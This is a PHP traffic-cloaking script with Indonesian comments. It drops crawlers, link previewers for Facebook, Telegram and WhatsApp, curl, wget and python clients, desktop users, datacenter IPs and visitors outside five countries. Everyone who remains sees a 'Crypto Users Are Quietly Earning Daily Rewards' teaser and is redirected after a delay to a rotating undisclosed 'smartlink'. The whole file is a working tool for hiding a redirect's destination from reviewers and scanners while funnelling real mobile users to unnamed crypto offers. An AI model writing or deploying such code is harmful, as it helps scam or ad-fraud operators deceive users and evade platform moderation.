<?php
// ================= CONFIG =================
$allowedCountries = ['US','CA','GB','AU','DE'];
$maxClicksNoResult = 7;     // toleransi
$delayMs = 1500;            // redirect delay
$dataDir = __DIR__.'/data/';
$statsFile = $dataDir.'stats.json';
$blockFile = $dataDir.'blocked_ips.json';
$linksFile = $dataDir.'smartlinks.json';

// init files
foreach ([$statsFile=>'{}',$blockFile=>'[]'] as $f=>$init) {
  if (!file_exists($f)) file_put_contents($f,$init);
}
if (!file_exists($linksFile)) die('No smartlinks');

// ================ BASIC FILTERS =================
// UA bot
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['bot','crawl','spider','facebook','telegram','whatsapp','curl','wget','python','java','monitor'];
foreach ($bots as $b) if (strpos($ua,$b)!==false) exit;
if (trim($ua)==='') exit;

// IP basic
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE)) exit;

// blocklist
$blocked = json_decode(file_get_contents($blockFile), true);
if (in_array($ip, $blocked)) exit;

// mobile only
if (!preg_match('/iphone|android|ipad|ipod|mobile/i', $ua)) exit;

// GEO + ASN (ipapi – gratis, rate‑limited)
$info = @json_decode(@file_get_contents("https://ipapi.co/{$ip}/json/"), true);
if (empty($info['country']) || !in_array($info['country'], $allowedCountries)) exit;

// ASN datacenter block (org name)
$dc = ['amazon','google','microsoft','ovh','digitalocean','linode','hetzner','vultr','contabo'];
$org = strtolower($info['org'] ?? '');
foreach ($dc as $d) if (strpos($org,$d)!==false) exit;

// ================= TRACKING =================
$subid = hash('sha256', $ip.$ua);
$stats = json_decode(file_get_contents($statsFile), true);
if (!isset($stats[$subid])) {
  $stats[$subid] = ['ip'=>$ip,'hits'=>0,'bad'=>0,'t'=>time()];
}
$stats[$subid]['hits']++;

// proxy “bad” logic: banyak klik, nol hasil internal
if ($stats[$subid]['hits'] >= $maxClicksNoResult) {
  $stats[$subid]['bad']++;
  if ($stats[$subid]['bad'] >= 2) {
    $blocked[] = $ip;
    file_put_contents($blockFile, json_encode(array_values(array_unique($blocked))));
    file_put_contents($statsFile, json_encode($stats));
    exit;
  }
}
file_put_contents($statsFile, json_encode($stats));

// ================= SMARTLINK ROTATION =================
$links = json_decode(file_get_contents($linksFile), true);
$available = array_values(array_filter($links['links'], fn($l)=>empty($l['paused'])));
if (!$available) exit;

$pick = $available[array_rand($available)];
foreach ($links['links'] as &$l) {
  if ($l['url']===$pick['url']) $l['hits']++;
}
// auto‑pause if internal bad ratio tinggi
foreach ($links['links'] as &$l) {
  if ($l['hits'] >= 50 && ($l['bad']/$l['hits']) > 0.9) $l['paused'] = true;
}
file_put_contents($linksFile, json_encode($links));

// ================= RENDER LP + DELAY REDIRECT =================
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Crypto Trend</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<h1>Crypto Users Are Quietly Earning Daily Rewards</h1>
<p>Early users are focusing on emerging crypto ecosystems that reward activity—not just capital. As adoption grows, early participation often benefits most.</p>

<script>
setTimeout(function(){
  window.location.href = <?= json_encode($pick['url']) ?>;
}, <?= (int)$delayMs ?>);
</script>
</body>
</html>
